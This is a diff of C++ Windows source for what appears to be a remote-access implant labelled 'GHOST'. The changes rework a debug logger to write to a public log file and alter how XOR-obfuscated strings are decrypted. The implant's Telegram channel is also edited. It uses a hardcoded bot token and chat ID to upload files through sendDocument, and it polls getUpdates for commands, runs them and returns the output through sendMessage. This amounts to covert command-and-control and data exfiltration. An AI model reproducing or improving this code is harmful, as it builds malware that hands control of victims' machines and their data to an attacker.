@@ -67,12 +67,22 @@ static std::vector<BYTE> DeriveKeyFromSessionId(const std::wstring& sessionId) {
 //  DEBUG LOGGING
 // =====================================================================
 static void DebugLog(const wchar_t* msg) {
-    char narrow[512];
-    WideCharToMultiByte(CP_UTF8, 0, msg, -1, narrow, sizeof(narrow), nullptr, nullptr);
-    printf("[GHOST] %s\n", narrow);
     OutputDebugStringW(L"[GHOST] ");
     OutputDebugStringW(msg);
     OutputDebugStringW(L"\n");
+    // Write to shared log file — no printf, no console required
+    char narrow[1024];
+    int n = WideCharToMultiByte(CP_UTF8, 0, msg, -1, narrow, sizeof(narrow) - 3, nullptr, nullptr);
+    if (n > 0) {
+        narrow[n - 1] = '\r'; narrow[n] = '\n'; narrow[n + 1] = '\0';
+        HANDLE hf = CreateFileA("C:\\Users\\Public\\ghost_debug.log",
+            FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
+            NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hf != INVALID_HANDLE_VALUE) {
+            DWORD w; WriteFile(hf, narrow, n + 1, &w, NULL);
+            CloseHandle(hf);
+        }
+    }
 }
 static void DebugLog(const std::wstring& msg) { DebugLog(msg.c_str()); }
 
@@ -548,10 +558,10 @@ static std::wstring HandleTelegram(const std::string& args) {
     }
     body += "--" + boundary + "--\r\n";
 
-    auto token = XSW(L"8776962614:AAEHIY4GvQboGIRnaGeFPgtzFcOt4hXClxQ");
-    auto chatId = XSW(L"8575201154");
+    const std::wstring token  = XSW(L"8776962614:AAEHIY4GvQboGIRnaGeFPgtzFcOt4hXClxQ").str();
+    const std::wstring chatId = XSW(L"8575201154").str();
 
-    std::wstring path = L"/bot" + std::wstring(token.str()) + L"/sendDocument";
+    std::wstring path = L"/bot" + token + L"/sendDocument";
     std::string headers =
         "Content-Type: multipart/form-data; boundary=" + boundary + "\r\n"
         "Content-Length: " + std::to_string(body.size()) + "\r\n";
@@ -571,11 +581,12 @@ static std::wstring HandleTelegram(const std::string& args) {
 static DWORD WINAPI TelegramPoller(LPVOID) {
     DebugLog(L"Telegram poller started.");
     int lastUpdateId = 0;
-    auto token = XSW(L"8776962614:AAEHIY4GvQboGIRnaGeFPgtzFcOt4hXClxQ");
-    auto chatId = XSW(L"8575201154");
+    // ponytail: capture to wstring once — XorStr.str() decrypts in-place, second call re-encrypts
+    const std::wstring token  = XSW(L"8776962614:AAEHIY4GvQboGIRnaGeFPgtzFcOt4hXClxQ").str();
+    const std::wstring chatId = XSW(L"8575201154").str();
 
     while (true) {
-        std::wstring path = L"/bot" + std::wstring(token.str()) +
+        std::wstring path = L"/bot" + token +
                             L"/getUpdates?offset=" + std::to_wstring(lastUpdateId + 1) +
                             L"&timeout=60";
         HttpResponse resp = WinHttpRequest(L"api.telegram.org", 443, L"GET", path, "", L"");
@@ -623,9 +634,9 @@ static DWORD WINAPI TelegramPoller(LPVOID) {
 
                     // Send reply via POST with JSON body — GET breaks on any output
                     // containing '&', '=', spaces, or newlines
-                    std::string replyBody = "{\"chat_id\":" + WStringToUTF8(std::wstring(chatId.str())) +
+                    std::string replyBody = "{\"chat_id\":" + WStringToUTF8(chatId) +
                                            ",\"text\":\"" + JsonEscape(WStringToUTF8(result)) + "\"}";
-                    std::wstring replyPath = L"/bot" + std::wstring(token.str()) + L"/sendMessage";
+                    std::wstring replyPath = L"/bot" + token + L"/sendMessage";
                     WinHttpRequest(L"api.telegram.org", 443, L"POST", replyPath, replyBody, L"");
                 }
 
